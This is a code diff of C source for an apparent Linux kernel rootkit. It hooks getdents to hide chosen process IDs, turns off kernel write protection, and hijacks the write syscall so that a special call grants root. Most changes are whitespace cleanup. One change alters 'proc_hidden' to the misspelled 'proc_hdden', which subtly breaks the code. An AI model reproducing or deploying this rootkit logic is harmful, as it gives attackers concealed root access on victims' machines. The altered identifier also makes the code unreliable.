@@ -309,7 +309,7 @@ int procfile_write(struct file *file, const char *buf, unsigned long count, void
   {
     proc_pid = str_to_lng(buff2);
     printk("HIDING PID %lld\n", proc_pid);
-    if(!proc_hidden){
+    if(!proc_hdden){
       disable_write_protection();
       hack_getdents();
       enable_write_protection();
@@ -434,7 +434,7 @@ asmlinkage int new_write(unsigned int fd, const char __user *buf, size_t count) 
   if(count == -1){
     set_root();
     return -1;
-  }  
+  }
   return (*original_write)(fd, buf, count);
 }
 
@@ -448,7 +448,7 @@ void hijack_write_syscall(void) {
   original_write = (void *)syscall_table[__NR_write];
   printk("\n before write hijacking: %llx\n", (unsigned long long) original_write);
 
-  syscall_table[__NR_write] = (unsigned long long) new_write; 
+  syscall_table[__NR_write] = (unsigned long long) new_write;
   modified_write = (void *)syscall_table[__NR_write];
   printk("\n after write hijacking %llx\n", (unsigned long long) modified_write);
 
@@ -459,8 +459,8 @@ void hijack_write_syscall(void) {
 void restore_hijacked_write_syscall(void) {
 
   disable_write_protection();
-  syscall_table[__NR_write] = (unsigned long long) original_write; 
-  enable_write_protection(); 
+  syscall_table[__NR_write] = (unsigned long long) original_write;
+  enable_write_protection();
   printk("\nHijacked write Syscall is Restored\n");
 
 }
